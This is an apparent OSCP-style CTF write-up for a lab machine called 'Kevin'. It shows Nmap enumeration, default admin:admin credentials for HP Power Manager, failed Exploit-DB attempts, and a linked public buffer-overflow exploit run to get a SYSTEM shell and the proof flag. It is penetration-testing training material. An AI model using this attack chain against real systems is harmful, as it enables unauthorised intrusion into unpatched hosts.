# Kevin - OSCP+ CTF Write-up

**Target IP:** 192.168.211.45  
**Date:** 2026-02-08  
**Difficulty:** Easy

## Enumeration

### Nmap Scan

```nmap
Nmap scan report for 192.168.211.45
Host is up (0.063s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          GoAhead WebServer (HP Power Manager)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows 7 Ultimate N 7600
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
| rdp-ntlm-info: 
|   Target_Name: KEVIN
|   NetBIOS_Domain_Name: KEVIN
|   NetBIOS_Computer_Name: KEVIN
|   DNS_Domain_Name: kevin
|   DNS_Computer_Name: kevin
|   Product_Version: 6.1.7600
|_  System_Time: 2026-02-08T08:47:17+00:00
| ssl-cert: Subject: commonName=kevin
| Issuer: commonName=kevin
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2026-02-07T08:43:15
| Not valid after:  2026-08-09T08:43:15
| MD5:     12fb 942b dbff e664 cc3f 43ee d970 c79a
| SHA-1:   ec80 3f49 27b3 b13a 95c6 3377 3987 2c27 4b7e 26c2
| SHA-256: c9aa 67af 06a3 5c68 a245 4b31 7217 86d9 d039 6fcf 3c98 ecd5 5c17 29c9 13da 97c4
| -----BEGIN CERTIFICATE-----
| MIICzjCCAbagAwIBAgIQR0ptA70sCJ1BTsiL2ofOfDANBgkqhkiG9w0BAQUFADAQ
| MQ4wDAYDVQQDEwVrZXZpbjAeFw0yNjAyMDcwODQzMTVaFw0yNjA4MDkwODQzMTVa
| MBAxDjAMBgNVBAMTBWtldmluMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKC
| AQEAmxkvbdDMkRjAWKnGSDpAcqMglJKGmPUKJ8BiGzs9zjG7OM45OmQQ8yb9KUEe
| AiqW4EJ1/wILYkovWi8mf35EQsxOMQY+1q/plAEj8Ove/cfnDA8cTk5MwxaRPzp5
| 6YFtATsGxcMcmLD5J2sS1bfy/M7W/9HlgYYMYU8m0i2uIhLj/D67j9XEXgZL1MdG
| xnTCVdTCsuvfen9ClBl0XuyQWmBGP31UnLJwTy3RW7iheLGCq3rJNg9otmiwmVZ1
| kQzSg4/EF8+woSY2NJI8j8UP5uld7LTohIpWNJj9RMtbiUiWgZXy2Dqrm3k3INcH
| qHTbzkLxUjkHJ1+UULOls0ux7QIDAQABoyQwIjATBgNVHSUEDDAKBggrBgEFBQcD
| ATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQEFBQADggEBAJVZ+YBagNWFzdFQk3fb
| U2SrgaM75zNCEj2GzDhnZ2e0f/hlGhOr5et0EmltaZ3un8Airj1vmXFNexCsU+gL
| kJebjb8oEQRE+WAGoLQIf8sPti0SbZGEuLegzY1+8lkmZd4b7JaQZis0Zz7c1wMh
| 19IgWSsvhFd37m73LeTFe4befsK1VCWg1m9pz/t20+MzhbTTRjT3ce4539phHUPu
| 4dUAdH+iXSHcIKKn4LQgg/nn3g7UbwryTmhwuUutDwoJzcqfBDt9nPmwMCfAvqNg
| M1PImGh2/4tpDWjHL/NuBTLp+44qT6Z9IpPiEeSinyP0dSRSlb0WapbyQ9Bc/IZy
| h+I=
|_-----END CERTIFICATE-----
|_ssl-date: 2026-02-08T08:47:25+00:00; -1s from scanner time.
3573/tcp  open  tag-ups-1?    syn-ack ttl 125
49152/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49158/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49159/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
Service Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Ultimate N 7600 (Windows 7 Ultimate N 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::-
|   Computer name: kevin
|   NetBIOS computer name: KEVIN\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-02-08T00:47:17-08:00
| smb2-time: 
|   date: 2026-02-08T08:47:17
|_  start_date: 2026-02-08T08:44:04
|_clock-skew: mean: 1h35m59s, deviation: 3h34m40s, median: -1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| nbstat: NetBIOS name: KEVIN, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:9e:d3:41 (VMware)
| Names:
|   KEVIN<00>            Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   KEVIN<20>            Flags: <unique><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   00 50 56 9e d3 41 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 41138/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 61672/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 56488/udp): CLEAN (Timeout)
|   Check 4 (port 17405/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:47
Completed NSE at 09:47, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:47
Completed NSE at 09:47, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:47
Completed NSE at 09:47, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.48 seconds
           Raw packets sent: 84261 (3.707MB) | Rcvd: 66636 (2.665MB)

```

### Key Findings

- **OS:** Windows 7 Ultimate N 7600
- **Hostname:** KEVIN
- **Web Server:** GoAhead WebServer running HP Power Manager on port 80
- **SMB:** Message signing disabled (potentially vulnerable)

### Web Enumeration

Browsing to port 80 reveals an HP Power Manager login page.

**Default credentials worked:** `admin:admin`

After logging in, identified **HP Power Manager version** from the interface.

![[Pasted image 20260208095546.png]]

## Initial Exploitation Attempts

### Attempt 1: GoAhead WebServer Exploit

Found exploit on Exploit-DB: https://www.exploit-db.com/exploits/4744

This exploit targets GoAhead WebServer password disclosure vulnerability but **did not work** for this version.

![[Pasted image 20260208095339.png]]

### Attempt 2: HP Power Manager Buffer Overflow (msfvenom)

Found another exploit: https://www.exploit-db.com/exploits/10099

Generated payload using msfvenom with bad character filtering, but the exploit **failed to work**. Decided to search for alternative PoC.

## Successful Exploitation

### HP Power Manager FormExportDataLogs Buffer Overflow

Found working Python exploit: https://github.com/Muhammd/HP-Power-Manager/blob/master/hpm_exploit.py

Executed the exploit:
```bash
python hpm_exploit.py 192.168.211.45
```

**Output:**
```
[+] Payload Fired... She will be back in less than a min...
[+] Give me 30 Sec!
Connection to 192.168.211.45 1234 port [tcp/*] succeeded!
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

## Privilege Escalation

**Not required!** The exploit provided direct `NT AUTHORITY\SYSTEM` access.
Verifying privileges:
```
C:\Windows\system32>whoami
nt authority\system
```

## Proof

Retrieved the proof flag:
```
C:\Users\Administrator\Desktop>type proof.txt && date
d016d3463b613dc6dffe2a154be45f20
The current date is: Sun 02/08/2026
```

## Key Takeaways

1. **Always test default credentials** - `admin:admin` worked on HP Power Manager
2. **Search for multiple PoCs** - The first exploit found didn't work; persistence in finding alternatives led to success
3. **GitHub can have better exploits than Exploit-DB** - The working exploit was found on GitHub, not Exploit-DB
4. **msfvenom payloads aren't always necessary** - The working exploit had its own payload mechanism
5. **Buffer overflow exploits can provide direct SYSTEM access** - No privilege escalation was needed

## Tools Used

- Nmap
- Python (for exploit execution)
- NetCat (listener)